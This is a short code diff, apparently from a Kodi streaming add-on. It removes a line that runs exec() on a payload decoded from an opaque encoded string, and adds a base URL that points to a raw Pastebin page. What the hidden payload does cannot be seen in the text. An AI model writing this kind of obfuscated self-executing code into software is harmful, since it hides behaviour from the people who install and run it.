@@ -1,1 +1,4 @@
-exec("import re;import base64sf");exec(base64sf.decode("base64.b64decode", "x9nYyF5Wl8-mo9bZg-HJoMvO49SoqE7El6fJm5eRjaDH2djIXlyaw6OWyMaD35DenInfxqOWksNWo5DHj9We18eP5tqYXJ2OmGDKjoyX1oeKvKOSb5VbyJNfjYeP28XSxMXUhaNunoqjYN2Oj9HF2MeXp5OYamLGm5fTyciXhrLLouqonaOmq3pky67MuK-oyZ6wh19dV4qildHHx9CExo7DrceRnZzWXlaU3YWaxZPJ0-Laplxfi2Jlmo7Am4bdxM7WxpqYndCygcXO0bHF2Mfd3NKmo6DWWGLX1c_Y2I2E3ZWOX10=)"))
+import xbmcaddon
+
+MainBase = 'http://pastebin.com/raw/AJ2EDapd'
+addon = xbmcaddon.Addon('plugin.video.roggerstream')
